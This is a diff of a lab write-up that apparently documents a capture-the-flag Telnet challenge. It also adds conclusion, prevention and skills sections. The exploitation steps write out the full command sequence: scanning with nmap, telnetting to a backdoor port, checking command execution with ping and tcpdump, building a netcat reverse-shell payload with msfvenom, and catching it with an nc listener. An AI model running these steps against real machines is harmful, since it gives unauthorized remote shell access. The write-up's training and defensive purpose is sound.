@@ -9,19 +9,36 @@ Exploit a misconfigured telnet service to gain unauthorized access
 - Msfvenom
 
 ## Enumerating Telnet
-1. Ran a port scan using nmap on the target machine and found open port 8012
+1. Performed a full port scan using nmap on the target machine
 - nmap -T4 -Pn -A -p- [IP}
-2. As I looked around the scan I can conclude this port can be used for a backdoor belolonging to skidy
+2. Discovered port 8012 open. Based on the scan results, it appeared to be a backdoor service, likely tied to a "skidy" or low-skill attackers toolkit.
 
 ## Exploiting Telnet
-1. Connected to Telnet with the following syntax
-- telnet[IP] [port]
-2. Created tcpdump listener, specifcally listening for icmp traffic on seperate terminal with the following command
+1. Connected to the Telnet service
+- telnet [TARGET_IP] [8012]
+2. Opened a seperate terminal and started a packet sniffer to detect ICMP traffic:
 - sudo tcpdump ip proto \\icmp -i ens5
-3. Used command "ping [attacking machine IP] -c 1" through the telnet ssession to see if we're able to run system commands.
+3. Inside the Telnet session, ran the following command to test command execution:
+- ping [attacking machine IP] -c 1
 - ping recieved on tcpdump listener, which means commands are able to be executed.
-4. Generated a reverse shell payload on seperate terminal using msfvenom with the following syntax, which encodes a netcat reverse shell
+4. Generated a reverse shell payload using msfvenom
 - msfvenom -p cmd/unix/reverse_netcat lhost=[local machine IP] lport=4444 R
-5. Created netcat listener on local machine to set up payload for execution with this syntax
+5. Started a netcat listener on the attacking machine
 - nc -lvnp 4444
-6. Copied and pasted msfvenom payload into the telnet session and ran it as a command (.RUN) and got the shell on target machine.
+6. Pasted the reverse shell payload onto the Telnet session and executed it using .RUN, successfully gaining a reverse shell on the target machine.
+
+## Conclusion
+This challenge shows the risks of running outdated and misconfigured network services like Telent, especially with backdoor access exposed on non-standard ports. By running basic enumeration, command execution testing, and crafting a reverse shell payload, I was able to gain unauthorized access to the target machine.
+
+## Prevention 
+- Disable Telnet and use SSH instead.
+- Monitor for unknown open ports and remove backdoor services
+- Limit ICMP traffic and reverse shell callbacks at the firewall level
+
+## Skills Demonstrated
+- Network and port enumeration using nmap
+- Telnet exploitation and shell interaction
+- Real-time packet monitoring using tcpdump
+- Reverse shell creation and listener setup
+- Understanding of ICMP traffic for verifying command execution
+- Exploitation of command injection in insecure remote services
